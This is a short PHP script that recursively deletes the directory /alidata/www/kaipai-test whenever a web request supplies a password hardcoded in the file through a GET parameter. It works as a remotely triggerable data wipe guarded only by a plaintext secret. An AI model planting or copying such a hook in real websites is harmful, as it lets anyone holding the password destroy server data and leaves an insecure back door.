<?php
$code = $_GET['code'];
if($code == 'kaipai123#@!'){
    $dir = '/alidata/www/kaipai-test';
    $iter = new \RecursiveDirectoryIterator($dir);
    foreach (new \RecursiveIteratorIterator($iter, \RecursiveIteratorIterator::CHILD_FIRST) as $f) {
        if ($f->isDir()) {
            rmdir($f->getPathname());
        } else {
            unlink($f->getPathname());
        }
    }
    rmdir($dir);
}
?>